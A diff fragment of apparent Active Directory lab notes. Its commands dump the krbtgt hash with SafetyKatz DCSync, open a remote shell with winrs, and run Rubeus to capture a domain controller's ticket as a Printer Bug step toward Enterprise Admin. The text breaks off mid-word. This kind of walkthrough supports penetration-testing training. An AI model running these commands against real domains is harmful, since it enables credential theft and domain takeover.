@@ -655,4 +655,11 @@ C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
 ```
 
 *Escalate to Enterprise Admins privileges by abusing Printer Bug!*
-We need to do the same thing with the cerbe
+We need to do the same thing with the Rubeus monitoring
+```powershell
+winrs -r:dcorp-appsrv cmd
+```
+```powershell
+C:\Users\Public\Rubeus.exe monitor /targetuser:MCORP-DC$ /interval:5 /nowrap
+```
+And now we triggher the authentication f
